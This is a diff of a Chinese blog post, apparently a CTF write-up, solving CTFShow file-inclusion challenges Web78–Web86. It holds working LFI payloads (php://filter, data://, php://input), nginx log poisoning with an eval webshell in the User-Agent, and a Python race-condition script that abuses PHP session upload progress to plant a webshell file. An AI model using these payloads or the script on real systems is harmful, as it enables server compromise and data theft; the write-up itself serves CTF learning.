@@ -1,70 +1,83 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="自由之翼" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="自由之翼" type="application/atom+xml"><link rel="alternate" type="application/json" title="自由之翼" href="https://zzk6th.github.io/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.12"><link rel="canonical" href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><title>CTF Show文件包含</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTF Show文件包含</h1><div class="meta"><span class="item" title="创建时间：2024-02-29 15:20:46"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-02-29T15:20:46+08:00">2024-02-29</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>2.2k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>2 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Wing Of Freedom</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://www.dmoe.cc/random.php?342301"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于CTF"><span itemprop="name">CTF<meta itemprop="position" content="0"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="zzk6th"/><meta itemprop="description" content=", 你猜?"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="自由之翼"/></span><div class="body md" itemprop="articleBody"><h1 id="Web78"><a href="#Web78" class="headerlink" title="Web78"></a>Web78</h1><p>用php伪协议绕过  </p>
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"/><meta name="theme-color" content="#222"/><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"/><meta name="renderer" content="webkit"/><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"/><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"/><link rel="alternate" href="/rss.xml" title="自由之翼" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="自由之翼" type="application/atom+xml"><link rel="alternate" type="application/json" title="自由之翼" href="https://zzk6th.github.io/feed.json"/><link rel="preconnect" href="https://lf9-cdn-tos.bytecdntp.com"/><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"/><link rel="dns-prefetch" href="https://unpkg.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.3.12"><link rel="canonical" href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><title>CTF Show文件包含</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">CTF Show文件包含</h1><div class="meta"><span class="item" title="创建时间：2024-02-29 15:20:46"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2024-02-29T15:20:46+08:00">2024-02-29</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>2.2k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>2 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Wing Of Freedom</a></li></ul><ul class="right" id="rightNav"><li class="item theme" @click="changeThemeByBtn"><i class="ic" :class="{'i-sun': !themeStatus,'i-moon': themeStatus}"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="https://www.dmoe.cc/random.php?951598"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemListElement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope="itemscope" itemtype="https://schema.org/ListItem"><a href="/categories/CTF/" itemprop="item" rel="index" title="分类于CTF"><span itemprop="name">CTF<meta itemprop="position" content="0"/></span></a></span></div><article class="post block" itemscope="itemscope" itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/><span hidden="hidden" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.jpg"/><meta itemprop="name" content="zzk6th"/><meta itemprop="description" content=", 你猜?"/></span><span hidden="hidden" itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="自由之翼"/></span><div class="body md" itemprop="articleBody"><h1 id="web78"><a class="anchor" href="#web78">#</a> Web78</h1>
+<p>用 php 伪协议绕过</p>
 <blockquote>
-<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php  </p>
+<p>?file=php://filter/convert.base64-encode/resource=flag.php</p>
 </blockquote>
-<h1 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h1><p>用date伪协议绕过</p>
+<h1 id="web79"><a class="anchor" href="#web79">#</a> web79</h1>
+<p>用 date 伪协议绕过</p>
 <blockquote>
-<p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;<br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(‘tac flag.p*p’);?&gt;  </p>
+<p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=<br />
+?file=data://text/plain,&lt;?= system('tac flag.p*p');?&gt;</p>
 </blockquote>
-<p>或者用input 大写php绕过  </p>
+<p>或者用 input 大写 php 绕过</p>
 <blockquote>
-<p>?file&#x3D;Php:&#x2F;&#x2F;input<br>post：&lt;?php system(‘ls’);?&gt;  </p>
+<p>?file=Php://input<br />
+post：&lt;?php system('ls');?&gt;</p>
 </blockquote>
-<h1 id="Web80"><a href="#Web80" class="headerlink" title="Web80"></a>Web80</h1><p>上题中input的php大写绕过jie还能用<br><img data-src="/%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png" alt="Image-1"><br>php和data伪协议都用不了了, 可以包含日志文件<br>通过Wappalyzer得知中间件是Nginx  </p>
+<h1 id="web80"><a class="anchor" href="#web80">#</a> Web80</h1>
+<p>上题中 input 的 php 大写绕过 jie 还能用<br />
+<img data-src="%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_2.png" alt="Image-1" /><br />
+php 和 data 伪协议都用不了了，可以包含日志文件<br />
+通过 Wappalyzer 得知中间件是 Nginx</p>
 <blockquote>
-<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>User-Agent: &lt;?php echo 123;phpinfo();eval($_POST[0]);?&gt;  </p>
+<p>?file=/var/log/nginx/access.log<br />
+User-Agent: &lt;?php echo 123;phpinfo();eval($_POST[0]);?&gt;</p>
 </blockquote>
-<p><em>直接连接蚁剑拿到flag</em>  </p>
-<h1 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h1><p>与上一题一样<br>传参</p>
+<p><em>直接连接蚁剑拿到 flag</em></p>
+<h1 id="web81"><a class="anchor" href="#web81">#</a> web81</h1>
+<p>与上一题一样<br />
+传参</p>
 <blockquote>
-<p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  </p>
+<p>?file=/var/log/nginx/access.log</p>
 </blockquote>
 <p>再改</p>
 <blockquote>
-<p>User-Agent: &lt;?php system(‘ls’);?&gt;  </p>
+<p>User-Agent: &lt;?php system('ls');?&gt;</p>
 </blockquote>
-<p>回车两次，得到  </p>
+<p>回车两次，得到</p>
 <blockquote>
-<p>fl0g.php index.php  </p>
+<p>fl0g.php index.php</p>
 </blockquote>
 <p>然后再改</p>
 <blockquote>
-<p>User-Agent: &lt;?php system(‘tac fl0g.p*p’);?&gt;  </p>
+<p>User-Agent: &lt;?php system('tac fl0g.p*p');?&gt;</p>
 </blockquote>
-<p>回车两次，得到最终flag<br><img data-src="/%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png" alt="Image-2">  </p>
-<h1 id="Web82-Web86"><a href="#Web82-Web86" class="headerlink" title="Web82~Web86"></a>Web82~Web86</h1><pre><code>import requests
+<p>回车两次，得到最终 flag<br />
+<img data-src="%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_3.png" alt="Image-2" /></p>
+<h1 id="web82~web86"><a class="anchor" href="#web82~web86">#</a> Web82~Web86</h1>
+<pre><code>import requests
 import io
 import threading
  
  
-url=&#39;http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/&#39;
-sessionid=&#39;ctfshow&#39;
+url='http://b04c7980-d374-4c39-9ebc-a612708262c8.challenge.ctf.show/'
+sessionid='ctfshow'
 data=&#123;
-&quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/muma.php&#39;,&#39;&lt;?php eval($_POST[a]);?&gt;&#39;);&quot;
+&quot;1&quot;:&quot;file_put_contents('/var/www/html/muma.php','&lt;?php eval($_POST[a]);?&gt;');&quot;
 &#125; 
  
-&#39;&#39;&#39;
+'''
 post 传递内容可在网站目录下写入一句话木马。
 根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。
 sessionid 可控，所以这里即 /tmp/sess_ctfshow。
 这样一旦访问成功，就说明木马植入了
-&#39;&#39;&#39;
+'''
  
  
 # /tmp/sess_sessionid 中写入一句话木马。
 def write(session): 
-fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)
+fileBytes = io.BytesIO(b'a'*1024*50)
 while True:
 response=session.post(
 url,
 data=&#123;
-&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?php eval($_POST[1]);?&gt;&#39;
+'PHP_SESSION_UPLOAD_PROGRESS':'&lt;?php eval($_POST[1]);?&gt;'
 &#125;,
 cookies=&#123;
-&#39;PHPSESSID&#39;:sessionid
+'PHPSESSID':sessionid
 &#125;,
 files=&#123;
-&#39;file&#39;:(&#39;ctfshow.jpg&#39;,fileBytes)
+'file':('ctfshow.jpg',fileBytes)
 &#125;
 )
  
@@ -73,20 +86,20 @@ files=&#123;
 def read(session):
 while True:
 response=session.post(
-url+&#39;?file=/tmp/sess_&#39;+sessionid,
+url+'?file=/tmp/sess_'+sessionid,
     data=data,
 cookies=&#123;
-&#39;PHPSESSID&#39;:sessionid
+'PHPSESSID':sessionid
 &#125;
 )
 # 访问木马文件，如果访问到了就代表竞争成功
-resposne2=session.get(url+&#39;muma.php&#39;)
+resposne2=session.get(url+'muma.php')
 if resposne2.status_code==200:
-print(&#39;++++++done++++++&#39;)
+print('++++++done++++++')
 else:
 print(resposne2.status_code)
  
-if __name__ == &#39;__main__&#39;:
+if __name__ == '__main__':
  
 evnet=threading.Event()
 # 写入和访问分别设置 5 个线程。
@@ -99,8 +112,10 @@ threading.Thread(target=read,args=(session,)).start()
 evnet.set()
  
 </code></pre>
-<p>运行脚本并成功写入后即可访问木马。<img data-src="/%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png" alt="Image-3"><br><img data-src="/%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png" alt="Image-4">  </p>
-<h1 id="Web87-未完待续"><a href="#Web87-未完待续" class="headerlink" title="Web87(未完待续)"></a>Web87(未完待续)</h1></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-02-29 16:45:35" itemprop="dateModified" datetime="2024-02-29T16:45:35+08:00">2024-02-29</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>zzk6th<i class="ic i-at"><em>@</em></i>自由之翼</li><li class="link"><strong>本文链接：</strong><a href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTF Show文件包含">https://zzk6th.github.io/CTF Show文件包含/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/hello-world/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;www.dmoe.cc&#x2F;random.php?455462" title="Hello World"><span class="type">上一篇</span><h3>Hello World</h3></a></div><div class="item right"></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web78"><span class="toc-number">1.</span> <span class="toc-text">Web78</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web79"><span class="toc-number">2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web80"><span class="toc-number">3.</span> <span class="toc-text">Web80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web81"><span class="toc-number">4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web82-Web86"><span class="toc-number">5.</span> <span class="toc-text">Web82~Web86</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web87-%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="toc-number">6.</span> <span class="toc-text">Web87(未完待续)</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li  class="active"><a href="/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTF Show文件包含">CTF Show文件包含</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="zzk6th" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">zzk6th</p><div class="description" itemprop="description">你猜?</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">2</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">1</span><span class="name">分类</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://githubfast.com/zzk6th" class="item github" title="https:&#x2F;&#x2F;githubfast.com&#x2F;zzk6th"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>网站</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/hello-world/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"></div><span><a href="/hello-world/">Hello World</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a></div><span><a href="/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTF Show文件包含</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2024 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">zzk6th @ Wing Of Freedom</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">3k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3 分钟</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
+<p>运行脚本并成功写入后即可访问木马。<img data-src="%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_4.png" alt="Image-3" /><br />
+<img data-src="%5Cassets%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5CCTFShow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_5.png" alt="Image-4" /></p>
+<h1 id="web87未完待续"><a class="anchor" href="#web87未完待续">#</a> Web87 (未完待续)</h1>
+</div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">更新于</span><time title="修改时间：2024-02-29 17:13:35" itemprop="dateModified" datetime="2024-02-29T17:13:35+08:00">2024-02-29</time></span></div><div id="copyright"><ul><li class="author"><strong>本文作者：</strong>zzk6th<i class="ic i-at"><em>@</em></i>自由之翼</li><li class="link"><strong>本文链接：</strong><a href="https://zzk6th.github.io/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTF Show文件包含">https://zzk6th.github.io/CTF Show文件包含/</a></li><li class="license"><strong>版权声明：</strong>本站所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/hello-world/" rel="prev" itemprop="url" data-background-image="https:&#x2F;&#x2F;www.dmoe.cc&#x2F;random.php?425348" title="Hello World"><span class="type">上一篇</span><h3>Hello World</h3></a></div><div class="item right"></div></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web78"><span class="toc-number">1.</span> <span class="toc-text"> Web78</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web79"><span class="toc-number">2.</span> <span class="toc-text"> web79</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web80"><span class="toc-number">3.</span> <span class="toc-text"> Web80</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web81"><span class="toc-number">4.</span> <span class="toc-text"> web81</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web82~web86"><span class="toc-number">5.</span> <span class="toc-text"> Web82~Web86</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web87%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="toc-number">6.</span> <span class="toc-text"> Web87 (未完待续)</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li  class="active"><a href="/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="bookmark" title="CTF Show文件包含">CTF Show文件包含</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="zzk6th" data-src="/assets/avatar.jpg"/><p class="name" itemprop="name">zzk6th</p><div class="description" itemprop="description">你猜?</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">2</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">1</span><span class="name">分类</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://githubfast.com/zzk6th" class="item github" title="https:&#x2F;&#x2F;githubfast.com&#x2F;zzk6th"><i class="ic i-github"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>网站</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/hello-world/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于CTF">CTF</a></div><span><a href="/CTF%20Show%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTF Show文件包含</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/hello-world/">Hello World</a></span></li></ul></div><div class="rpost pjax"><h2>最新评论</h2><ul class="leancloud-recent-comment" id="new-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2024 -<span itemprop="copyrightYear">2024</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">zzk6th @ Wing Of Freedom</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">3k 字</span><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">3 分钟</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL = {
         path: `CTF Show文件包含/`,
         favicon: {
         show: `（●´3｀●）やれやれだぜ`,
